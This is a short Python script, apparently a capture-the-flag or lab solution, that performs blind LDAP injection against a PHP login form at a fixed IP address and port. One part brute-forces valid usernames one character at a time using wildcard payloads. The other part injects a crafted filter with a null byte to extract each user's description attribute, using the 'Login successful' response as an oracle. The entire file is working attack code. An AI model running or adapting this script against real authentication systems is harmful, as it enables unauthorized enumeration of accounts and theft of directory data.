import requests
wordlist = 'abcdefghijklmnopqrstuvwxyz0123456789@!?-{}'
username = []
descripciones = []

def enumerates_usernames(prefijo,username):
    caracter_encontrado = False
    for i in wordlist:
        caracteres = prefijo+ i
        data = {"username":f"{caracteres}*","password":"*"} 
        respuesta = requests.post('http://94.237.62.103:50226/index.php',data=data)
        if 'Login successful' in respuesta.text:
            caracter_encontrado = True
            enumerates_usernames(caracteres,username) 
    if not caracter_encontrado:
        print(f"Un username valido es : {prefijo}")
        username.append(prefijo)

def enumerate_description(prefijo,username):
    prefijo = ''
    for i in username:
        while(True):
            caracter_encontrado = False
            for j in wordlist:
                data = {"username":f"{i})(description={prefijo}{j}*))\x00","password":"test"} 
                respuesta = requests.post('http://94.237.62.103:50226/index.php',data=data)
                if 'Login successful' in respuesta.text:
                    caracter_encontrado = True
                    prefijo += j
                    break
            if caracter_encontrado == False:
                print(f"La descripcion del usuario '{i}' es: {prefijo}")
                descripciones.append(prefijo)
                prefijo = ''
                break

enumerates_usernames("",username)
enumerate_description("",username)
